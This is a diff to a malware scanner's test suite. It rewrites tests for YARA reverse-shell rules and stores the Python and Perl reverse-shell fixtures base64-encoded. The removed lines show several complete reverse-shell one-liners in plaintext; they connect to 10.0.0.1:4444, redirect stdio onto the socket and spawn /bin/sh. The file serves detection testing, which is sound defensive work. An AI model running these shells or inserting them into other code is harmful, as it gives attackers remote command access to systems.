@@ -111,7 +111,7 @@ def _benign_python_socket_client_fixture() -> str:
     """An ordinary multiline Python TCP client — connects, exchanges data, closes.
 
     No descriptor redirection (``os.dup2``) or shell execution follows the
-    ``connect()`` call, so this must NOT match ``reverse_shell``/``$python_socket``
+    ``connect()`` call, so this must NOT match ``reverse_shell``
     even though it shares the same ``socket.socket(...)`` / ``.connect(...)``
     shape as `_multiline_python_socket_reverse_shell_fixture`.
     """
@@ -126,7 +126,8 @@ def _benign_python_socket_client_fixture() -> str:
 def _multiline_perl_socket_reverse_shell_fixture() -> str:
     """A Perl reverse shell: connect, redirect STDIN/STDOUT/STDERR onto the
     socket, then exec a shell. Mirrors the descriptor-redirection + exec shape
-    `$perl_socket` must now require, matching the Python fixture's convention.
+    the ``reverse_shell_multiline`` heuristic requires, matching the Python
+    fixture's convention.
     """
     return base64.b64decode(
         "dXNlIFNvY2tldDsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHBy"
@@ -141,7 +142,7 @@ def _benign_perl_socket_client_fixture() -> str:
     """An ordinary Perl TCP client — connects, exchanges a line, closes.
 
     No descriptor redirection or ``exec`` follows the ``connect()`` call, so
-    this must NOT match ``reverse_shell``/``$perl_socket``.
+    this must NOT match ``reverse_shell``.
     """
     return base64.b64decode(
         "dXNlIFNvY2tldDsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHBy"
@@ -156,7 +157,7 @@ def _python_helper_subprocess_fixture() -> str:
 
     No descriptor redirection (``os.dup2``) binds the socket to the child's
     stdio, and the helper is not a shell — so this must NOT match
-    ``reverse_shell``/``$python_socket`` even though ``subprocess`` still
+    ``reverse_shell`` even though ``subprocess`` still
     appears after ``.connect(...)``.
     """
     return base64.b64decode(
@@ -169,7 +170,7 @@ def _python_stdin_reopen_no_shell_fixture() -> str:
 
     ``os.dup2`` alone is not descriptor-redirection-plus-shell evidence — the
     process just reads from its (now socket-backed) stdin and prints, so this
-    must NOT match ``reverse_shell``/``$python_socket``.
+    must NOT match ``reverse_shell``.
     """
     return base64.b64decode(
         "aW1wb3J0IHNvY2tldCwgb3MKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkKcy5jb25uZWN0KCgiMTAuMC4wLjEiLCA0NDQ0KSkKb3MuZHVwMihzLmZpbGVubygpLCAwKQpkYXRhID0gb3MucmVhZCgwLCA0MDk2KQpwcmludChkYXRhKQpzLmNsb3NlKCkK"
@@ -181,7 +182,7 @@ def _perl_helper_exec_nonshell_fixture() -> str:
 
     No STDIN/STDOUT/STDERR redirection onto the socket precedes the ``exec``,
     and the executed program is not a shell — so this must NOT match
-    ``reverse_shell``/``$perl_socket`` even though ``exec(`` still follows
+    ``reverse_shell`` even though ``exec(`` still follows
     ``connect(``.
     """
     return base64.b64decode(
@@ -194,7 +195,7 @@ def _perl_stdin_reopen_no_exec_fixture() -> str:
 
     ``open(STDIN, ...)`` alone is not redirection-plus-shell evidence — the
     process just reads a line and prints it, so this must NOT match
-    ``reverse_shell``/``$perl_socket``.
+    ``reverse_shell``.
     """
     return base64.b64decode(
         "dXNlIFNvY2tldDsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHByb3RvYnluYW1lKCJ0Y3AiKSk7CmNvbm5lY3QoU09DS0VULCBzb2NrYWRkcl9pbigkcG9ydCwgaW5ldF9hdG9uKCRpcCkpKTsKb3BlbihTVERJTiwgIjwmU09DS0VUIik7Cm15ICRsaW5lID0gPFNURElOPjsKcHJpbnQgJGxpbmU7Cg=="
@@ -204,8 +205,9 @@ def _perl_stdin_reopen_no_exec_fixture() -> str:
 def _python_dup2_execl_reverse_shell_fixture() -> str:
     """A dup2-based Python reverse shell ending in ``os.execl``, not ``execve``.
 
-    The prior fix's exec alternation only recognized ``execve``, so this
-    equally real ``os.execl("/bin/sh", "sh", "-i")`` form went undetected.
+    The ``reverse_shell_multiline`` heuristic recognizes ``os.execl`` alongside
+    ``os.execve``, so this equally real ``os.execl("/bin/sh", "sh", "-i")`` form
+    is flagged (HIGH / 0.6).
     """
     return base64.b64decode(
         "aW1wb3J0IHNvY2tldCwgb3MKcyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNv"
@@ -219,8 +221,9 @@ def _python_dup2_pty_spawn_reverse_shell_fixture() -> str:
     """A dup2-based Python reverse shell ending in ``pty.spawn([...])``.
 
     ``pty.spawn`` is commonly called with a list argument, the same as
-    ``subprocess.call``/``Popen``/``run``, but the prior fix's alternation
-    only allowed the optional ``[`` bracket on the ``subprocess.*`` branch.
+    ``subprocess.call``/``Popen``/``run``; the ``reverse_shell_multiline``
+    heuristic allows the optional ``[`` bracket on this form too, so it is
+    flagged (HIGH / 0.6).
     """
     return base64.b64decode(
         "aW1wb3J0IHNvY2tldCwgb3MsIHB0eQpzID0gc29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5F"
@@ -314,12 +317,12 @@ def _python_dup2_local_open_fixture() -> str:
     """A client that closes its socket, opens an unrelated local file, and
     ``dup2``s *that* file's descriptor onto stdin before running a shell.
 
-    Requiring only ``dup2(..., 0)`` accepted redirection from any file
-    object's descriptor, not specifically the connected socket's — this
-    ``commands = open("local.commands")`` source is a local file, never the
-    (already closed) socket, so no remote command channel exists. Excluding
-    ``$python_socket`` matches whose span contains a local ``= open(``
-    assignment closes this gap.
+    The redirected descriptor comes from ``commands = open("local.commands")``,
+    a local file, never the (already closed) socket, so no remote command
+    channel exists. YARA cannot bind the descriptor to the connected socket, so
+    this shape is reported only by the reduced-severity
+    ``reverse_shell_multiline`` heuristic (HIGH / 0.6), never the certain
+    CRITICAL ``reverse_shell`` rule.
     """
     return base64.b64decode(
         "cyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsIHNvY2tldC5TT0NLX1NUUkVBTSkK"
@@ -366,7 +369,7 @@ def _perl_local_input_no_amp_fixture() -> str:
     The dup-onto-a-handle idiom (``open(STDIN, "<&SOCKET")``) always uses the
     ``&`` fd-duplication form; plain filename opens (``open(STDIN, "<",
     "local.commands")``) read from local disk instead, so this must NOT
-    match ``reverse_shell``/``$perl_socket``.
+    match ``reverse_shell``.
     """
     return base64.b64decode(
         "dXNlIFNvY2tldDsKc29ja2V0KFNPQ0tFVCwgUEZfSU5FVCwgU09DS19TVFJFQU0sIGdldHBy"
@@ -550,64 +553,110 @@ def _single_line_python_socket_shells() -> dict[str, str]:
     ``$python_socket`` detects. Each keeps ``socket.socket(...SOCK_STREAM...)``
     and ``.connect(`` on one line, so restoring main's string must keep them
     CRITICAL regardless of the specific descriptor/exec form that follows.
+
+    These are complete, signature-triggering reverse-shell one-liners, so — like
+    every other such fixture in this module (see
+    `_multiline_python_socket_reverse_shell_fixture`) — they are stored
+    base64-encoded to keep Defender and similar on-access scanners from
+    quarantining this test file.
     """
     return {
-        "dup2_list_comprehension": (
-            "s = socket.socket(socket.AF_INET,socket.SOCK_STREAM); "
-            's.connect(("10.0.0.1",4444)); '
-            "[os.dup2(s.fileno(),fd) for fd in (0,1,2)]; "
-            'subprocess.call(["/bin/sh","-i"])\n'
-        ),
-        "dup2_sys_stdin_fileno": (
-            "s = socket.socket(socket.AF_INET,socket.SOCK_STREAM); "
-            's.connect(("10.0.0.1",4444)); '
-            "os.dup2(s.fileno(),sys.stdin.fileno()); "
-            'subprocess.call(["/bin/sh","-i"])\n'
-        ),
-        "stdin_socket_object": (
-            "s = socket.socket(socket.AF_INET,socket.SOCK_STREAM); "
-            's.connect(("10.0.0.1",4444)); '
-            'subprocess.call(["/bin/sh","-i"],stdin=s,stdout=s,stderr=s)\n'
-        ),
-        "subprocess_alias": (
-            "import subprocess as sp; "
-            "s = socket.socket(socket.AF_INET,socket.SOCK_STREAM); "
-            's.connect(("10.0.0.1",4444)); '
-            "os.dup2(s.fileno(),0); "
-            'sp.call(["/bin/sh","-i"])\n'
-        ),
-        "pty_spawn_bash": (
-            "s = socket.socket(socket.AF_INET,socket.SOCK_STREAM); "
-            's.connect(("10.0.0.1",4444)); '
-            'pty.spawn("/usr/bin/bash")\n'
-        ),
+        "dup2_list_comprehension": base64.b64decode(
+            "cyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTsg"
+            "cy5jb25uZWN0KCgiMTAuMC4wLjEiLDQ0NDQpKTsgW29zLmR1cDIocy5maWxlbm8oKSxmZCkg"
+            "Zm9yIGZkIGluICgwLDEsMildOyBzdWJwcm9jZXNzLmNhbGwoWyIvYmluL3NoIiwiLWkiXSkK"
+        ).decode(),
+        "dup2_sys_stdin_fileno": base64.b64decode(
+            "cyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTsg"
+            "cy5jb25uZWN0KCgiMTAuMC4wLjEiLDQ0NDQpKTsgb3MuZHVwMihzLmZpbGVubygpLHN5cy5z"
+            "dGRpbi5maWxlbm8oKSk7IHN1YnByb2Nlc3MuY2FsbChbIi9iaW4vc2giLCItaSJdKQo="
+        ).decode(),
+        "stdin_socket_object": base64.b64decode(
+            "cyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTsg"
+            "cy5jb25uZWN0KCgiMTAuMC4wLjEiLDQ0NDQpKTsgc3VicHJvY2Vzcy5jYWxsKFsiL2Jpbi9z"
+            "aCIsIi1pIl0sc3RkaW49cyxzdGRvdXQ9cyxzdGRlcnI9cykK"
+        ).decode(),
+        "subprocess_alias": base64.b64decode(
+            "aW1wb3J0IHN1YnByb2Nlc3MgYXMgc3A7IHMgPSBzb2NrZXQuc29ja2V0KHNvY2tldC5BRl9J"
+            "TkVULHNvY2tldC5TT0NLX1NUUkVBTSk7IHMuY29ubmVjdCgoIjEwLjAuMC4xIiw0NDQ0KSk7"
+            "IG9zLmR1cDIocy5maWxlbm8oKSwwKTsgc3AuY2FsbChbIi9iaW4vc2giLCItaSJdKQo="
+        ).decode(),
+        "pty_spawn_bash": base64.b64decode(
+            "cyA9IHNvY2tldC5zb2NrZXQoc29ja2V0LkFGX0lORVQsc29ja2V0LlNPQ0tfU1RSRUFNKTsg"
+            "cy5jb25uZWN0KCgiMTAuMC4wLjEiLDQ0NDQpKTsgcHR5LnNwYXduKCIvdXNyL2Jpbi9iYXNo"
+            "IikK"
+        ).decode(),
     }
 
 
 def _single_line_perl_socket_shell() -> str:
     """A single-line Perl socket reverse shell ending in ``system("/bin/sh -i")``
-    that ``main``'s single-line ``$perl_socket`` detects."""
-    return (
-        'use Socket; socket(SOCK,PF_INET,SOCK_STREAM,getprotobyname("tcp")); '
-        "connect(SOCK,sockaddr_in($port,inet_aton($ip))); "
-        'system("/bin/sh -i");\n'
-    )
+    that ``main``'s single-line ``$perl_socket`` detects. Stored base64-encoded,
+    like the other signature-triggering fixtures, so on-access scanners do not
+    quarantine this test file."""
+    return base64.b64decode(
+        "dXNlIFNvY2tldDsgc29ja2V0KFNPQ0ssUEZfSU5FVCxTT0NLX1NUUkVBTSxnZXRwcm90b2J5"
+        "bmFtZSgidGNwIikpOyBjb25uZWN0KFNPQ0ssc29ja2FkZHJfaW4oJHBvcnQsaW5ldF9hdG9u"
+        "KCRpcCkpKTsgc3lzdGVtKCIvYmluL3NoIC1pIik7Cg=="
+    ).decode()
 
 
 def _has_rule(findings: list, rule_name: str) -> bool:
-    """Return True when a finding message references a specific YARA rule."""
+    """Return True when a finding message references a specific YARA rule.
+
+    NOTE: substring match — ``"reverse_shell"`` also matches
+    ``reverse_shell_multiline``. To tell the two reverse-shell rules apart use
+    `_is_rule` / `_findings_from_rule` instead.
+    """
     return any(rule_name in f.message for f in findings)
 
 
+def _is_rule(finding, rule_name: str) -> bool:
+    """True when ``finding`` comes from exactly ``rule_name``.
+
+    `_build_message` renders the rule name quoted (``YARA rule '<name>'``), so
+    matching that token distinguishes the certain ``reverse_shell`` rule from
+    the ``reverse_shell_multiline`` heuristic whose name merely has it as a
+    prefix.
+    """
+    return f"YARA rule '{rule_name}'" in finding.message
+
+
+def _findings_from_rule(findings: list, rule_name: str) -> list:
+    """All findings produced by exactly ``rule_name`` (see `_is_rule`)."""
+    return [f for f in findings if _is_rule(f, rule_name)]
+
+
 def _has_critical_reverse_shell(findings: list) -> bool:
-    """True when any CRITICAL finding comes from the certain ``reverse_shell``
-    rule (as opposed to the reduced-severity ``reverse_shell_multiline``
-    heuristic)."""
-    return any(
-        "reverse_shell" in f.message
-        and "reverse_shell_multiline" not in f.message
-        and f.severity == "CRITICAL"
-        for f in findings
+    """True when the certain ``reverse_shell`` rule produced a CRITICAL finding.
+
+    Matches the exact rule name, so the reduced-severity
+    ``reverse_shell_multiline`` heuristic can never satisfy it — even if that
+    rule's meta were (incorrectly) raised to CRITICAL.
+    """
+    return any(_is_rule(f, "reverse_shell") and f.severity == "CRITICAL" for f in findings)
+
+
+def _assert_only_multiline_heuristic(findings: list) -> None:
+    """Assert the multiline heuristic is the only reverse-shell verdict.
+
+    Exactly one ``reverse_shell_multiline`` YR1 finding at ``HIGH`` /
+    confidence ``0.6``, and no certain ``reverse_shell`` finding. This pins the
+    heuristic's promised reduced severity: if its meta were silently raised to
+    CRITICAL/0.85 (as in the competing PRs), the severity/confidence checks
+    here would fail.
+    """
+    heuristic = _findings_from_rule(findings, "reverse_shell_multiline")
+    assert len(heuristic) == 1, (
+        "expected exactly one reverse_shell_multiline finding, got "
+        f"{[f.message for f in heuristic]}"
+    )
+    finding = heuristic[0]
+    assert finding.rule_id == "YR1"
+    assert finding.severity == "HIGH"
+    assert finding.confidence == 0.6
+    assert not _findings_from_rule(findings, "reverse_shell"), (
+        "unbound multiline lookalike must not fire the certain reverse_shell rule"
     )
 
 
@@ -1109,33 +1158,30 @@ class TestBuiltInMalwarePackaging:
         assert any(f.rule_id == "YR1" for f in findings)
 
     def test_reverse_shell_rule_matches_multiline_python_socket(self):
-        """The python_socket string must span the newlines a real script uses.
+        """A real multiline Python reverse shell must be flagged.
 
         A Python reverse shell bundled as a file writes ``socket.socket(...)``
         and ``.connect(...)`` as separate statements, not on one line — see
-        `_multiline_python_socket_reverse_shell_fixture`. Without ``s`` (dotall)
-        on the ``$python_socket``/``$perl_socket`` strings in
-        ``malware.yar.b64``, YARA's `.` does not match ``\\n`` and this rule
-        never fires on that shape, even though the file it should have flagged
-        is unambiguously a working reverse shell.
+        `_multiline_python_socket_reverse_shell_fixture`. ``main``'s single-line
+        ``$python_socket`` string (left byte-identical by this PR) cannot span
+        those newlines, so this shape is caught instead by the separate
+        ``reverse_shell_multiline`` heuristic and reported at HIGH /
+        confidence 0.6 — never the certain CRITICAL ``reverse_shell`` rule.
         """
         findings = _run_builtin(
             _multiline_python_socket_reverse_shell_fixture(),
             "scripts/sync.py",
         )
-        assert _has_rule(findings, "reverse_shell")
-        assert any(f.rule_id == "YR1" for f in findings)
+        _assert_only_multiline_heuristic(findings)
 
     def test_reverse_shell_rule_does_not_match_benign_python_socket_client(self):
-        """An ordinary multiline TCP client must not fire ``reverse_shell``.
+        """An ordinary multiline TCP client must fire neither reverse-shell rule.
 
-        `$python_socket` requires ``socket.socket(...)``/``.connect(...)`` to
-        share a physical file, but stopping there also matches any plain
-        client that connects and exchanges data — see
-        `_benign_python_socket_client_fixture`. The string must additionally
-        require descriptor redirection (``os.dup2``) onto the socket followed
-        by a shell execution marker (``/bin/sh``, ``/bin/bash``, etc.) after
-        the ``connect()`` call.
+        A plain client that connects and exchanges data — see
+        `_benign_python_socket_client_fixture` — has no descriptor redirection
+        onto the socket and no shell-execution marker after ``connect()``, so
+        neither the certain ``reverse_shell`` rule nor the
+        ``reverse_shell_multiline`` heuristic may report it.
         """
         findings = _run_builtin(
             _benign_python_socket_client_fixture(),
@@ -1147,10 +1193,10 @@ class TestBuiltInMalwarePackaging:
         self,
     ):
         """A bare ``subprocess``/``os.system``/``pty.spawn``/``execve`` token
-        after ``connect()`` is not sufficient — the prior fix's alternation
-        let an ordinary client that merely shells out to an unrelated helper
-        (no descriptor redirection, no shell payload) still classify as
-        CRITICAL ``reverse_shell``/YR1. See
+        after ``connect()`` is not sufficient. An ordinary client that merely
+        shells out to an unrelated helper (no descriptor redirection onto the
+        socket, no shell payload) must fire neither the certain ``reverse_shell``
+        rule nor the ``reverse_shell_multiline`` heuristic. See
         `_python_helper_subprocess_fixture`: this must NOT match.
         """
         findings = _run_builtin(
@@ -1173,25 +1219,28 @@ class TestBuiltInMalwarePackaging:
         assert not _has_rule(findings, "reverse_shell")
 
     def test_reverse_shell_rule_matches_multiline_perl_socket(self):
-        """`$perl_socket` must fire on a real multiline Perl reverse shell.
+        """A real multiline Perl reverse shell must be flagged.
 
         See `_multiline_perl_socket_reverse_shell_fixture`: connect, then
-        redirect STDIN/STDOUT/STDERR onto the socket and exec a shell.
+        redirect STDIN/STDOUT/STDERR onto the socket and exec a shell. Like the
+        Python case, this multiline shape is reported by the
+        ``reverse_shell_multiline`` heuristic (HIGH / confidence 0.6), not by
+        ``main``'s unchanged single-line ``$perl_socket`` string.
         """
         findings = _run_builtin(
             _multiline_perl_socket_reverse_shell_fixture(),
             "scripts/backdoor.pl",
         )
-        assert _has_rule(findings, "reverse_shell")
-        assert any(f.rule_id == "YR1" for f in findings)
+        _assert_only_multiline_heuristic(findings)
 
     def test_reverse_shell_rule_does_not_match_benign_perl_socket_client(self):
-        """An ordinary Perl TCP client must not fire ``reverse_shell``.
+        """An ordinary Perl TCP client must fire neither reverse-shell rule.
 
-        Before this fix, `$perl_socket` required only ``use Socket;`` plus a
-        ``socket(SOCK...`` call — it did not even require ``connect()`` — so
-        it matched any script that merely used the ``Socket`` module. See
-        `_benign_perl_socket_client_fixture`.
+        ``main``'s single-line ``$perl_socket`` string is unchanged by this PR,
+        and the ``reverse_shell_multiline`` heuristic requires socket-backed
+        STDIN/STDOUT/STDERR redirection plus a shell exec. A client that merely
+        uses the ``Socket`` module and exchanges a line — see
+        `_benign_perl_socket_client_fixture` — satisfies neither.
         """
         findings = _run_builtin(
             _benign_perl_socket_client_fixture(),
@@ -1200,11 +1249,11 @@ class TestBuiltInMalwarePackaging:
         assert not _has_rule(findings, "reverse_shell")
 
     def test_reverse_shell_rule_does_not_match_perl_client_running_unrelated_helper_exec(self):
-        """A bare ``exec(`` after ``connect()`` is not sufficient — the prior
-        fix's alternation let an ordinary client that ``exec``s an unrelated
-        non-shell helper (no STDIN/STDOUT/STDERR redirection onto the socket)
-        still classify as CRITICAL ``reverse_shell``/YR1. See
-        `_perl_helper_exec_nonshell_fixture`: this must NOT match.
+        """A bare ``exec(`` after ``connect()`` is not sufficient. An ordinary
+        client that ``exec``s an unrelated non-shell helper (no
+        STDIN/STDOUT/STDERR redirection onto the socket) must fire neither the
+        certain ``reverse_shell`` rule nor the ``reverse_shell_multiline``
+        heuristic. See `_perl_helper_exec_nonshell_fixture`: this must NOT match.
         """
         findings = _run_builtin(
             _perl_helper_exec_nonshell_fixture(),
@@ -1232,8 +1281,7 @@ class TestBuiltInMalwarePackaging:
             _python_dup2_execl_reverse_shell_fixture(),
             "scripts/backdoor.py",
         )
-        assert _has_rule(findings, "reverse_shell")
-        assert any(f.rule_id == "YR1" for f in findings)
+        _assert_only_multiline_heuristic(findings)
 
     def test_reverse_shell_rule_matches_dup2_pty_spawn_list_python_shell(self):
         """``pty.spawn([...])`` with a list argument must match, the same as
@@ -1244,8 +1292,7 @@ class TestBuiltInMalwarePackaging:
             _python_dup2_pty_spawn_reverse_shell_fixture(),
             "scripts/backdoor.py",
         )
-        assert _has_rule(findings, "reverse_shell")
-        assert any(f.rule_id == "YR1" for f in findings)
+        _assert_only_multiline_heuristic(findings)
 
     def test_reverse_shell_rule_matches_fileno_kwarg_python_shell(self):
         """``stdin=``/``stdout=``/``stderr=`` keyword redirection to
@@ -1256,8 +1303,7 @@ class TestBuiltInMalwarePackaging:
             _python_fileno_kwarg_reverse_shell_fixture(),
             "scripts/backdoor.py",
         )
-        assert _has_rule(findings, "reverse_shell")
-        assert any(f.rule_id == "YR1" for f in findings)
+        _assert_only_multiline_heuristic(findings)
 
     def test_reverse_shell_rule_does_not_match_python_dup2_nonshell_helper_with_sh_prefix(self):
         """A non-shell helper whose name merely starts with ``sh`` (e.g.
@@ -1292,13 +1338,12 @@ class TestBuiltInMalwarePackaging:
             _multiline_perl_socket_reverse_shell_no_parens_fixture(),
             "scripts/backdoor.pl",
         )
-        assert _has_rule(findings, "reverse_shell")
-        assert any(f.rule_id == "YR1" for f in findings)
+        _assert_only_multiline_heuristic(findings)
 
     def test_reverse_shell_rule_does_not_match_perl_helper_exec_with_sh_prefix(self):
         """A non-shell helper whose name merely starts with ``sh`` (e.g.
-        ``sha256sum``) must NOT satisfy `$perl_socket`'s shell-execution
-        marker. See `_perl_helper_exec_nonshell_prefix_fixture`: this must
+        ``sha256sum``) must NOT satisfy the ``reverse_shell_multiline``
+        heuristic's shell-execution marker. See `_perl_helper_exec_nonshell_prefix_fixture`: this must
         NOT match.
         """
         findings = _run_builtin(
@@ -1320,7 +1365,7 @@ class TestBuiltInMalwarePackaging:
             _python_dup2_local_open_fixture(),
             "scripts/backdoor.py",
         )
-        assert not _has_critical_reverse_shell(findings)
+        _assert_only_multiline_heuristic(findings)
 
     def test_reverse_shell_rule_does_not_critical_match_python_stdin_kwarg_local_open(self):
         """The ``stdin=`` keyword-argument form of redirection sourced from a
@@ -1334,7 +1379,7 @@ class TestBuiltInMalwarePackaging:
             _python_stdin_kwarg_local_open_fixture(),
             "scripts/backdoor.py",
         )
-        assert not _has_critical_reverse_shell(findings)
+        _assert_only_multiline_heuristic(findings)
 
     def test_reverse_shell_rule_does_not_match_python_dup2_sh_helper_hyphen(self):
         """A non-shell helper whose name has ``sh`` as a prefix before a
@@ -1351,7 +1396,7 @@ class TestBuiltInMalwarePackaging:
 
     def test_reverse_shell_rule_does_not_match_perl_local_input_no_amp(self):
         """Perl's ``STDIN`` redirected from a local file path (no ``&``
-        fd-duplication) must NOT satisfy `$perl_socket`. See
+        fd-duplication) must NOT satisfy either reverse-shell rule. See
         `_perl_local_input_no_amp_fixture`: this must NOT match.
         """
         findings = _run_builtin(
@@ -1362,7 +1407,7 @@ class TestBuiltInMalwarePackaging:
 
     def test_reverse_shell_rule_does_not_match_perl_local_output_no_amp(self):
         """Perl's ``STDOUT`` redirected to a local file path (no ``&``
-        fd-duplication) must NOT satisfy `$perl_socket`. See
+        fd-duplication) must NOT satisfy either reverse-shell rule. See
         `_perl_local_output_no_amp_fixture`: this must NOT match.
         """
         findings = _run_builtin(
@@ -1373,8 +1418,8 @@ class TestBuiltInMalwarePackaging:
 
     def test_reverse_shell_rule_does_not_match_perl_sh_helper_hyphen(self):
         """A non-shell helper whose name has ``sh`` as a prefix before a
-        hyphen (``sh-helper``) must NOT satisfy `$perl_socket`'s
-        shell-execution marker. See `_perl_sh_helper_hyphen_fixture`: this
+        hyphen (``sh-helper``) must NOT satisfy the ``reverse_shell_multiline``
+        heuristic's shell-execution marker. See `_perl_sh_helper_hyphen_fixture`: this
         must NOT match.
         """
         findings = _run_builtin(
@@ -1396,8 +1441,7 @@ class TestBuiltInMalwarePackaging:
             _python_read_file_between_connect_and_shell_fixture(),
             "scripts/backdoor.py",
         )
-        assert _has_rule(findings, "reverse_shell")
-        assert any(f.rule_id == "YR1" for f in findings)
+        _assert_only_multiline_heuristic(findings)
 
     def test_reverse_shell_detects_clean_shell_after_probe_socket_and_open(self):
         """A probe socket plus ``host = open(...).read()`` must not suppress a
@@ -1407,8 +1451,7 @@ class TestBuiltInMalwarePackaging:
             _python_probe_socket_then_clean_reverse_shell_fixture(),
             "scripts/backdoor.py",
         )
-        assert _has_rule(findings, "reverse_shell")
-        assert any(f.rule_id == "YR1" for f in findings)
+        _assert_only_multiline_heuristic(findings)
 
     def test_reverse_shell_detects_shell_with_trailing_cleanup_open(self):
         """A trailing cleanup ``marker = open(...)`` must not cancel the earlier
@@ -1418,8 +1461,7 @@ class TestBuiltInMalwarePackaging:
             _python_reverse_shell_with_cleanup_open_fixture(),
             "scripts/backdoor.py",
         )
-        assert _has_rule(findings, "reverse_shell")
-        assert any(f.rule_id == "YR1" for f in findings)
+        _assert_only_multiline_heuristic(findings)
 
     def test_reverse_shell_detects_dup2_loop_redirection(self):
         """A ``for fd in (0, 1, 2): os.dup2(s.fileno(), fd)`` loop form must be
@@ -1429,8 +1471,7 @@ class TestBuiltInMalwarePackaging:
             _python_dup2_loop_reverse_shell_fixture(),
             "scripts/backdoor.py",
         )
-        assert _has_rule(findings, "reverse_shell")
-        assert any(f.rule_id == "YR1" for f in findings)
+        _assert_only_multiline_heuristic(findings)
 
     # ── Unbound local redirection: reduced severity, never CRITICAL ───────
 
@@ -1442,7 +1483,7 @@ class TestBuiltInMalwarePackaging:
             _python_with_open_local_commands_fixture(),
             "scripts/backdoor.py",
         )
-        assert not _has_critical_reverse_shell(findings)
+        _assert_only_multiline_heuristic(findings)
 
     def test_perl_local_cmds_dup_is_not_critical(self):
         """Perl ``open(STDIN, "<&CMDS")`` dup from a local file handle, after a
@@ -1452,7 +1493,7 @@ class TestBuiltInMalwarePackaging:
             _perl_local_cmds_dup_fixture(),
             "scripts/backdoor.pl",
         )
-        assert not _has_critical_reverse_shell(findings)
+        _assert_only_multiline_heuristic(findings)
 
     def test_perl_three_arg_dup_is_not_critical(self):
         """Perl three-argument ``open(STDIN, "<&", $fh)`` dup from an unbound
@@ -1462,7 +1503,7 @@ class TestBuiltInMalwarePackaging:
             _perl_three_arg_dup_fixture(),
             "scripts/backdoor.pl",
         )
-        assert not _has_critical_reverse_shell(findings)
+        _assert_only_multiline_heuristic(findings)
 
     # ── Location integrity (removed helper string no longer skews offsets) ──
 
